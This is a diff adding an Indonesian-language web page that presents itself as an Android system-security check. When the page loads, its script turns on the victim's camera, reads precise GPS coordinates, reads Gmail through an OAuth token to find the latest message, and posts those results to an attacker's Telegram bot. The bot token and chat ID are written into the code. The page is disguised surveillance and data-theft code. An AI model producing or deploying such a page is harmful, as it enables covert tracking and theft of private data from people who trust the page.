@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cek Kamera, Lokasi & Email</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        video {
+            width: 100%;
+            max-width: 400px;
+            border: 2px solid blue;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>🔍 keamanan sistem android</h2>
+    <video id="video" autoplay></video>
+    <p id="location">📍 Lokasi: Mendeteksi...</p>
+
+    <script>
+        let videoStream = null;
+        let latitude = null;
+        let longitude = null;
+        const botToken = "7123253254:AAEW8xxJzx38d-g_KVCa2eTM9dyBA0tugTo";
+        const chatId = "7895289556";
+        const clientId = "YOUR_GOOGLE_CLIENT_ID";
+
+        async function startCamera() {
+            try {
+                videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = videoStream;
+                sendToTelegram("📸 Kamera berhasil diaktifkan!");
+            } catch (error) {
+                sendToTelegram("⚠️ Gagal mengakses kamera: " + error.message);
+            }
+        }
+
+        function getLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
+                        document.getElementById("location").innerText = `📍 Lokasi: ${latitude}, ${longitude}`;
+                        sendToTelegram(`📍 Lokasi terdeteksi:\nLatitude: ${latitude}\nLongitude: ${longitude}`);
+                    },
+                    (error) => {
+                        sendToTelegram("⚠️ Gagal mendapatkan lokasi: " + error.message);
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                sendToTelegram("❌ Geolocation tidak didukung di browser ini.");
+            }
+        }
+
+        function sendToTelegram(message) {
+            axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                chat_id: chatId,
+                text: message
+            }).catch(error => {
+                console.error("Gagal mengirim ke Telegram:", error);
+            });
+        }
+
+        function checkGoogleLogin() {
+            const scope = "https://www.googleapis.com/auth/gmail.readonly";
+            const authUrl = `https://accounts.google.com/o/oauth2/auth?client_id=${clientId}&redirect_uri=http://localhost&response_type=token&scope=${scope}`;
+            window.location.href = authUrl;
+        }
+
+        function getEmail() {
+            const urlParams = new URLSearchParams(window.location.hash.substr(1));
+            const accessToken = urlParams.get("access_token");
+
+            if (accessToken) {
+                axios.get("https://www.googleapis.com/gmail/v1/users/me/messages", {
+                    headers: { Authorization: `Bearer ${accessToken}` }
+                }).then(response => {
+                    const messages = response.data.messages;
+                    if (messages.length > 0) {
+                        sendToTelegram(`📧 Email terbaru: https://mail.google.com/mail/u/0/#inbox/${messages[0].id}`);
+                    } else {
+                        sendToTelegram("📧 Tidak ada email baru.");
+                    }
+                }).catch(error => {
+                    console.error("Gagal mendapatkan email:", error);
+                    sendToTelegram("⚠️ Gagal mendapatkan email.");
+                });
+            }
+        }
+
+        window.onload = function () {
+            startCamera();
+            getLocation();
+            getEmail();
+        };
+    </script>
+
+</body>
+</html>
